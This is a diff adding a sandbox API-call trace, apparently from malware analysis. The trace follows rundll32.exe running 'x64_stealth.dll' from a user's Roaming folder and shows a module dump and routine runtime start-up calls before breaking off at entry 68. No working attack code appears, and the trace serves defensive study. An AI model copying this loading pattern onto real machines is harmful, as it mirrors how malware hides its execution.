@@ -1,0 +1,4418 @@
+Creation de Processus, pid [0xa6c] (C:\Windows\System32\rundll32.exe)
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xb3c]
+
+
+********** Dumping PEB64 **********
+
+	Path : C:\Windows\system32\rundll32.exe
+	Base : 0x00007FF7E51A0000
+	Size : 0x13000
+	.reload /s /f C:\Windows\system32\rundll32.exe=0x00007FF7E51A0000
+
+	Path : C:\Windows\SYSTEM32\ntdll.dll
+	Base : 0x00007FFA02600000
+	Size : 0x1ac000
+	.reload /s /f C:\Windows\SYSTEM32\ntdll.dll=0x00007FFA02600000
+
+	Path : C:\Windows\system32\KERNEL32.DLL
+	Base : 0x00007FFA00270000
+	Size : 0x13e000
+	.reload /s /f C:\Windows\system32\KERNEL32.DLL=0x00007FFA00270000
+
+	Path : C:\Windows\system32\KERNELBASE.dll
+	Base : 0x00007FF9FF880000
+	Size : 0x115000
+	.reload /s /f C:\Windows\system32\KERNELBASE.dll=0x00007FF9FF880000
+
+	Path : C:\Windows\system32\USER32.dll
+	Base : 0x00007FFA000B0000
+	Size : 0x177000
+	.reload /s /f C:\Windows\system32\USER32.dll=0x00007FFA000B0000
+
+	Path : C:\Windows\system32\msvcrt.dll
+	Base : 0x00007FFA00BA0000
+	Size : 0xaa000
+	.reload /s /f C:\Windows\system32\msvcrt.dll=0x00007FFA00BA0000
+
+	Path : C:\Windows\system32\imagehlp.dll
+	Base : 0x00007FFA003B0000
+	Size : 0x16000
+	.reload /s /f C:\Windows\system32\imagehlp.dll=0x00007FFA003B0000
+
+	Path : C:\Windows\system32\SHLWAPI.dll
+	Base : 0x00007FFA008B0000
+	Size : 0x54000
+	.reload /s /f C:\Windows\system32\SHLWAPI.dll=0x00007FFA008B0000
+
+	Path : C:\Windows\SYSTEM32\combase.dll
+	Base : 0x00007FF9FFC80000
+	Size : 0x211000
+	.reload /s /f C:\Windows\SYSTEM32\combase.dll=0x00007FF9FFC80000
+
+	Path : C:\Windows\system32\GDI32.dll
+	Base : 0x00007FF9FFF50000
+	Size : 0x151000
+	.reload /s /f C:\Windows\system32\GDI32.dll=0x00007FF9FFF50000
+
+	Path : C:\Windows\system32\RPCRT4.dll
+	Base : 0x00007FFA00570000
+	Size : 0x141000
+	.reload /s /f C:\Windows\system32\RPCRT4.dll=0x00007FFA00570000
+
+	Path : C:\Windows\system32\IMM32.DLL
+	Base : 0x00007FFA00230000
+	Size : 0x36000
+	.reload /s /f C:\Windows\system32\IMM32.DLL=0x00007FFA00230000
+
+	Path : C:\Windows\system32\MSCTF.dll
+	Base : 0x00007FFA02170000
+	Size : 0x153000
+	.reload /s /f C:\Windows\system32\MSCTF.dll=0x00007FFA02170000
+
+	Path : C:\Users\user\AppData\Roaming\x64_stealth.dll
+	Base : 0x0000000180000000
+	Size : 0x1c7000
+	.reload /s /f C:\Users\user\AppData\Roaming\x64_stealth.dll=0x0000000180000000
+
+	Path : C:\Windows\system32\ADVAPI32.dll
+	Base : 0x00007FF9FFEA0000
+	Size : 0xaa000
+	.reload /s /f C:\Windows\system32\ADVAPI32.dll=0x00007FF9FFEA0000
+
+	Path : C:\Windows\system32\SHELL32.dll
+	Base : 0x00007FFA00C50000
+	Size : 0x1519000
+	.reload /s /f C:\Windows\system32\SHELL32.dll=0x00007FFA00C50000
+
+	Path : C:\Windows\system32\ole32.dll
+	Base : 0x00007FFA02460000
+	Size : 0x194000
+	.reload /s /f C:\Windows\system32\ole32.dll=0x00007FFA02460000
+
+	Path : C:\Windows\system32\OLEAUT32.dll
+	Base : 0x00007FFA00920000
+	Size : 0xc1000
+	.reload /s /f C:\Windows\system32\OLEAUT32.dll=0x00007FFA00920000
+
+	Path : C:\Windows\system32\PSAPI.DLL
+	Base : 0x00007FFA00910000
+	Size : 0x7000
+	.reload /s /f C:\Windows\system32\PSAPI.DLL=0x00007FFA00910000
+
+	Path : C:\Windows\system32\SETUPAPI.dll
+	Base : 0x00007FFA006D0000
+	Size : 0x1da000
+	.reload /s /f C:\Windows\system32\SETUPAPI.dll=0x00007FFA006D0000
+
+	Path : C:\Windows\SYSTEM32\sechost.dll
+	Base : 0x00007FFA023A0000
+	Size : 0x59000
+	.reload /s /f C:\Windows\SYSTEM32\sechost.dll=0x00007FFA023A0000
+
+	Path : C:\Windows\system32\CFGMGR32.dll
+	Base : 0x00007FF9FFA50000
+	Size : 0x4f000
+	.reload /s /f C:\Windows\system32\CFGMGR32.dll=0x00007FF9FFA50000
+
+********** End Dump PEB64 **********
+
+[CNT] [1]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010A220
+[STR]         -> "api-ms-win-core-synch-l1-2-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800b2769
+
+[CNT] [2]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801027B8 ("InitializeCriticalSectionEx")
+[RET] [0x1800b281e] in [x64_stealth.dll]
+
+[CNT] [3]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010A1E0
+[STR]         -> "api-ms-win-core-fibers-l1-1-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800b2769
+
+[CNT] [4]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102780 ("FlsAlloc")
+[RET] [0x1800b281e] in [x64_stealth.dll]
+
+[CNT] [5]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801027A8 ("FlsSetValue")
+[RET] [0x1800b281e] in [x64_stealth.dll]
+
+[CNT] [6]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010A220
+[STR]         -> "api-ms-win-core-synch-l1-2-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [7]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801027B8 ("InitializeCriticalSectionEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [8]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010A1E0
+[STR]         -> "api-ms-win-core-fibers-l1-1-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [9]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102780 ("FlsAlloc")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [10]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102798 ("FlsGetValue")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [11]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801027A8 ("FlsSetValue")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [12]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetStartupInfoW> in [KERNEL32.DLL] 
+[PAR] LPSTARTUPINFOW lpStartupInfo : 0x000000E03FBAECC0
+[RET] [0x1800d26f6] in [x64_stealth.dll]
+
+[CNT] [13]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetCommandLineA> in [KERNEL32.DLL] 
+[RET] [0x1800d786a] in [x64_stealth.dll]
+
+[CNT] [14]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetCommandLineW> in [KERNEL32.DLL] 
+[RET] [0x1800d7877] in [x64_stealth.dll]
+
+[CNT] [15]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010E8C0
+[STR]         -> "api-ms-win-core-localization-l1-2-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [16]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102B30 ("LCMapStringEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [17]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000E03FBAE010
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000E03FBAE650
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] [0x1800d44f7] in [x64_stealth.dll]
+
+[CNT] [18]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000E03FBAE010
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000E03FBAE750
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] [0x1800d44f7] in [x64_stealth.dll]
+
+[CNT] [19]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlInitializeSListHead> in [ntdll.dll] 
+[RET] [0x1800923c5] in [x64_stealth.dll]
+
+[CNT] [20]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x0000000180102760 ("kernel32.dll")
+[RET] [0x1800708a3] in [x64_stealth.dll]
+
+[CNT] [21]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102780 ("FlsAlloc")
+[RET] [0x1800708b6] in [x64_stealth.dll]
+
+[CNT] [22]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102790 ("FlsFree")
+[RET] [0x1800708d4] in [x64_stealth.dll]
+
+[CNT] [23]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102798 ("FlsGetValue")
+[RET] [0x1800708f2] in [x64_stealth.dll]
+
+[CNT] [24]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801027A8 ("FlsSetValue")
+[RET] [0x180070910] in [x64_stealth.dll]
+
+[CNT] [25]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801027B8 ("InitializeCriticalSectionEx")
+[RET] [0x18007092e] in [x64_stealth.dll]
+
+[CNT] [26]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801027D8 ("InitOnceExecuteOnce")
+[RET] [0x18007094c] in [x64_stealth.dll]
+
+[CNT] [27]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801027F0 ("CreateEventExW")
+[RET] [0x18007096a] in [x64_stealth.dll]
+
+[CNT] [28]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102800 ("CreateSemaphoreW")
+[RET] [0x180070988] in [x64_stealth.dll]
+
+[CNT] [29]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102818 ("CreateSemaphoreExW")
+[RET] [0x1800709a6] in [x64_stealth.dll]
+
+[CNT] [30]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102830 ("CreateThreadpoolTimer")
+[RET] [0x1800709c4] in [x64_stealth.dll]
+
+[CNT] [31]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102848 ("SetThreadpoolTimer")
+[RET] [0x1800709e2] in [x64_stealth.dll]
+
+[CNT] [32]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102860 ("WaitForThreadpoolTimerCallbacks")
+[RET] [0x180070a00] in [x64_stealth.dll]
+
+[CNT] [33]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102880 ("CloseThreadpoolTimer")
+[RET] [0x180070a1e] in [x64_stealth.dll]
+
+[CNT] [34]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102898 ("CreateThreadpoolWait")
+[RET] [0x180070a3c] in [x64_stealth.dll]
+
+[CNT] [35]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801028B0 ("SetThreadpoolWait")
+[RET] [0x180070a5a] in [x64_stealth.dll]
+
+[CNT] [36]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801028C8 ("CloseThreadpoolWait")
+[RET] [0x180070a78] in [x64_stealth.dll]
+
+[CNT] [37]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801028E0 ("FlushProcessWriteBuffers")
+[RET] [0x180070a96] in [x64_stealth.dll]
+
+[CNT] [38]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102900 ("FreeLibraryWhenCallbackReturns")
+[RET] [0x180070ab4] in [x64_stealth.dll]
+
+[CNT] [39]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102920 ("GetCurrentProcessorNumber")
+[RET] [0x180070ad2] in [x64_stealth.dll]
+
+[CNT] [40]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180100438 ("CreateSymbolicLinkW")
+[RET] [0x180070af0] in [x64_stealth.dll]
+
+[CNT] [41]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102940 ("GetCurrentPackageId")
+[RET] [0x180070b0e] in [x64_stealth.dll]
+
+[CNT] [42]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102958 ("GetTickCount64")
+[RET] [0x180070b2c] in [x64_stealth.dll]
+
+[CNT] [43]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102968 ("GetFileInformationByHandleEx")
+[RET] [0x180070b4a] in [x64_stealth.dll]
+
+[CNT] [44]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102988 ("SetFileInformationByHandle")
+[RET] [0x180070b68] in [x64_stealth.dll]
+
+[CNT] [45]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801029A8 ("GetSystemTimePreciseAsFileTime")
+[RET] [0x180070b86] in [x64_stealth.dll]
+
+[CNT] [46]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801029C8 ("InitializeConditionVariable")
+[RET] [0x180070ba4] in [x64_stealth.dll]
+
+[CNT] [47]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801029E8 ("WakeConditionVariable")
+[RET] [0x180070bc2] in [x64_stealth.dll]
+
+[CNT] [48]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A00 ("WakeAllConditionVariable")
+[RET] [0x180070be0] in [x64_stealth.dll]
+
+[CNT] [49]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A20 ("SleepConditionVariableCS")
+[RET] [0x180070bfe] in [x64_stealth.dll]
+
+[CNT] [50]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A40 ("InitializeSRWLock")
+[RET] [0x180070c1c] in [x64_stealth.dll]
+
+[CNT] [51]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A58 ("AcquireSRWLockExclusive")
+[RET] [0x180070c3a] in [x64_stealth.dll]
+
+[CNT] [52]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A70 ("TryAcquireSRWLockExclusive")
+[RET] [0x180070c58] in [x64_stealth.dll]
+
+[CNT] [53]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A90 ("ReleaseSRWLockExclusive")
+[RET] [0x180070c76] in [x64_stealth.dll]
+
+[CNT] [54]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102AA8 ("SleepConditionVariableSRW")
+[RET] [0x180070c94] in [x64_stealth.dll]
+
+[CNT] [55]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102AC8 ("CreateThreadpoolWork")
+[RET] [0x180070cb2] in [x64_stealth.dll]
+
+[CNT] [56]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102AE0 ("SubmitThreadpoolWork")
+[RET] [0x180070cd0] in [x64_stealth.dll]
+
+[CNT] [57]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102AF8 ("CloseThreadpoolWork")
+[RET] [0x180070cee] in [x64_stealth.dll]
+
+[CNT] [58]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102B10 ("CompareStringEx")
+[RET] [0x180070d0c] in [x64_stealth.dll]
+
+[CNT] [59]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102B20 ("GetLocaleInfoEx")
+[RET] [0x180070d2a] in [x64_stealth.dll]
+
+[CNT] [60]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102B30 ("LCMapStringEx")
+[RET] [0x180070d48] in [x64_stealth.dll]
+
+[CNT] [61]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x0000000180107620 ("api-ms-win-core-synch-l1-2-0.dll")
+[RET] [0x180091780] in [x64_stealth.dll]
+
+[CNT] [62]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801029C8 ("InitializeConditionVariable")
+[RET] [0x1800917b1] in [x64_stealth.dll]
+
+[CNT] [63]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A20 ("SleepConditionVariableCS")
+[RET] [0x1800917c4] in [x64_stealth.dll]
+
+[CNT] [64]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102A00 ("WakeAllConditionVariable")
+[RET] [0x1800917d7] in [x64_stealth.dll]
+
+[CNT] [65]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlInitializeSRWLock> in [ntdll.dll] 
+[RET] [0x180091802] in [x64_stealth.dll]
+
+[CNT] [66]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetModuleFileNameA> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x000000018016B580
+[PAR] DWORD   nSize      : 0x104
+[RET] [0x1800ccaef] in [x64_stealth.dll]
+
+[CNT] [67]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetEnvironmentStringsW> in [KERNEL32.DLL] 
+[RET] [0x1800d78a7] in [x64_stealth.dll]
+
+[CNT] [68]
